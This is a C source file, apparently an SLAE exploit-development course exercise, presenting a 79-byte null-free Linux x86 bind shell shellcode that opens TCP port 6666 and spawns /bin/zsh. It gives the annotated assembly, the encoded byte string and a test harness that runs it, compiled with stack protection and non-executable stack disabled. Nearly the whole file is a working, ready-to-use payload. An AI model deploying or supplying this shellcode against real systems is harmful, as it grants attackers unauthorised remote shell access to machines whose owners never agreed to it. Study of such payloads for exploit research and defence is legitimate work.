/*
;Linux x86 bind shell port 6666
;Auther: H4554n AlMusajjen
;Tested on i686 GNU/Linux
;Shellcode Length is:79
;SLAE - 1057
;Date: 11/21/2017
;Bind Port   : 6666
;Description : A linux/x86 bind shell via /bin/zsh.;
;          original payload was 96 bytes. My shellcode
;          is 79 containing 0 NULLS.

Original Shellcode from exploit-db:
				https://www.exploit-db.com/exploits/40222/

Test using:
    gcc -fno-stack-protector -z execstack shellcode.c

global _start

section .text

_start:	
        xor ebx, ebx
        push 0x66
	pop eax 		; sys_socketcall = 102 & saving one byte here insted of clearing and moving
        cdq			;EDX=0 saving one more byte here 

        ; 1 - create socket
        ; socket(AF_INET, SOCK_STREAM, 0);
        ; #define SYS_SOCKET      1               // sys_socket(2) 
        push ebx 		; null
        inc ebx 		; socketcall() socket = 1 & one byte has been saved here.
        push ebx 		; stack = 0, 1 & one byte size reduction
        push 0x2 		; stack = 0, 1, 2 (0, SOCK_STREAM, AF_INET)
        mov ecx, esp 		; mov stack ptr to ecx
        int 0x80 		; init

        ; 2 - Bind port
        ; bind(fd, (struct sockaddr *) &s_addr, 16);
        ; #define SYS_BIND        2               // sys_bind(2)

        pop ebx 		; sys_bind = 2
        pop esi  		; = 1
        push edx 		; stack = [0]
        push dword 0x0A1A0002 	; stack = [0, port_num "6666"]
        push byte 0x10 		; stack = [0, port_num, 2], 16
        push ecx 		; stack = [0, port_num, 2], 16, pointer
        push eax 		; stack = [0, port_num, 2], 16, *ptr, fd
        mov ecx, esp 		; move stack ptr to ecx
	mov al,0x66 		; sys_socketcall = 102

        int 0x80 		; init

        ; 3 - Listen
        ; listen(fd, 1);
        ; #define SYS_LISTEN      4               // sys_listen(2) 
	mov [ecx+4],eax
        mov al, 0x66 ; sys_socketcall = 102
        mov bl, 0x4 ; reduction by one byte insted of adding 0x2
        int 0x80 ; init

        ; 4 - Accept
        ; accept(fd, NULL, NULL);
        ; #define SYS_ACCEPT      5               // sys_accept(2) 
	;alot of instructions has been removed sice the same functionality will be getten
        mov al, 0x66 ; sys_socketcall = 102
        inc ebx ; make 5 for listen (4 from listen)
       	int 0x80 ; init

        ; 5 - dup
        ; sys_dup2 = 63 = 0x3f

        xchg eax, ebx   ; ebx = fd / eax = 5
        pop ecx    	; insted of NULL ecx by xor we will pop 0x3 and then-
			; we will decreament this will save us three bytes
        dec ecx		; and here ecx should equal to two

        dup2: ; STDIN, STDOUT, STDERR
                mov al, 0x3f    ; sys_dup2
                int 0x80        ; init
                dec cl          ; decrement counter
                jns dup2        ; Jump on No Sign (Positive)

        ; 6 - execve /bin/zsh
        ; normal execve shell exec

        push eax
        push 0x68737a2f ; hsz/
        push 0x6e69622f ; nib/

        mov ebx, esp

       push eax
       ;mov edx, esp the following instruction has been removed inorder to save
	;		two more bytes

        push ebx
        mov ecx, esp

        mov al, 0xb     ; sys_execve (11)
        int 0x80        ; init
*/
#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x31\xdb\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x68\x02\x00\x1a\x0a\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x89\x41\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x93\x59\x49\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
int main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}
